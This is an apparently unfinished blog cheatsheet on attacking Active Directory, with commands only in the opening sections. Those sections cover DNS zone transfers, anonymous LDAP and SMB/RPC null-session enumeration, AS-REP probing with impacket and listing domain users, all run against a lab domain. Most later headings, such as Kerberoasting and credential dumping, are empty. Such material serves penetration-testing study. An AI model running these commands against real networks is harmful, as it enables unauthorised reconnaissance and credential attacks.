---
layout: post
title:  Attacking Active Directory Cheatsheet
description: Cheatsheet for Attacking Active Directory
date:   2024-11-01 01:00:00 +0300
image:  '/images/10000.jpg'
tags:   [Cheatsheets, Tools, Active-Directory, Active-Directory-Enumeration, SMB, Kerberoasting, AS-REP-Roasting, DCSync, Silver-Ticket, ACLs, MSSQL, Credential-Dumping, Credential-Hunting]
---
### Uncredentialed Enumeration and Attacks
```shell
# DNS Zone Transfer
dig @172.16.150.10 AXFR vorkharium.com

# LDAP Anonymous Session Dump
ldapsearch -x -H ldap://172.16.150.10 -b "dc=vorkharium,dc=com"

# No-PreAuth Kerberos without Username
impacket-GetNPUsers vorkharium.com/ -dc-ip 172.16.150.10

# SMB Null Session with smbclient
smbclient -L 172.16.150.10 -N
smbclient -N -L //172.16.150.10
smbclient --no-pass -L //172.16.150.10
smbclient //172.16.150.10/Public -N
smbclient -U '%' -N \\\\172.16.150.10\\Public

# SMB Null Session with other tools
smbmap -H 172.16.150.10 -P 445
nxc smb 172.16.150.10 --shares -u 'guest' -p ''
crackmapexec smb 172.16.150.10 -u '' -p '' --shares
impacket-smbclient vorkharium.com/'':''@172.16.150.10

# RPC Null Session
rpcclient 172.16.150.10 -N
rpcclient -U "" -N 172.16.150.10
rpcclient -U="" 172.16.150.10

# RPC Commands
querydispinfo
enumdomusers
enumdomgroups
queryuser johnwick

# impacket-rpcdump
impacket-rpcdump -port 135 vorkharium.com/'':''@172.16.150.10

# enum4linux
enum4linux -U 172.16.150.10

```
### Domain Password Policy Enumeration
```shell
# NetExec and CrackMapExec
nxc smb 172.16.150.10 -u 'vorkharium' -p 'password' --pass-pol
crackmapexec smb 172.16.150.10 -u 'vorkharium' -p 'password' --pass-pol

# enum4linux
enum4linux -U 172.16.150.10 # Without credentials
enum4linux -u vorkharium -p password -U 172.16.150.10

# From CMD CLI
net accounts
net user vorkharium /domain

# From PowerShell CLI
net accounts
Get-ADDefaultDomainPasswordPolicy
(Get-ADDomain).DefaultPasswordPolicy
Get-WmiObject -Class Win32_NetworkLoginProfile | Select-Object -Property Name, PasswordExpirationDate
```
### Domain Users Enumeration
```shell
# With impacket-GetADUsers
impacket-GetADUsers -all -dc-ip 172.16.150.10 vorkharium.com/johnwick:'Password123!'

# My custom way of creating a list of domain_users.txt list with one command
impacket-GetADUsers -all -dc-ip 172.16.150.10 vorkharium.com/johnwick:'Password123!' | awk 'NR>3 {print $1}' >> domain_users.txt

```
### Groups Enumeration
```shell

```
### SMB Shares Enumeration and Access
```shell

```
### RPC Enumeration
```shell

```
### GPO cPassword
```shell

```
### Password Spraying
```shell

```
### Local PowerShell Enumeration
```shell

```
### Local Credential Hunting
```shell

```
### Runas and RunasCs.exe
```shell

```
### BloodHound, SharpHound.exe, bloodhound-python
```shell

```
### PowerView.ps1
```shell

```
### Impacket PsExec, WmiExec and SMBExec - SMB Shell Access with Password or Pass-the-Hash
```shell

```
### Evil-WinRM - Access WinRM with Password or Pass-the-Hash
```shell

```
### xfreerdp - Access RDP with Password or Pass-the-Hash
```shell

```
### Kerberoasting with Impacket
```shell

```
### Kerberoasting with Rubeus.exe
```shell

```
### AS-REP Roasting with Impacket
```shell

```
### Remote Credential Dumping with Impacket and NetExec
```shell

```
### Local Credential Dumping with Mimikatz and Impacket
```shell

```
### Silver Ticket
```shell

```
### ACLs
```shell

```
### MSSQL to gain Shell
```shell

```